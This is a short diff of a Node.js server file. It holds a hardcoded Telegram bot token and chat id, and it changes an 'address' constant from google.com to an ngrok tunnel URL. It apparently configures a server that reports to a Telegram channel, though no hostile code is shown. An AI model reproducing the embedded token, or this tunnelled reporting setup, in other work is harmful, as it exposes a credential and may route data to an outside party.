@@ -9,7 +9,7 @@ const axios = require("axios");
 
 const token = "8225595203:AAGMnDqfiA6jRPaGSZadFOidk33ujPnu25k";
 const id = "-1002508968072";
-const address = 'https://www.google.com';
+const address = 'http://guiding-decrease-moneywise.ngrok-free.dev';
 
 const app = express();
 const appServer = http.createServer(app);
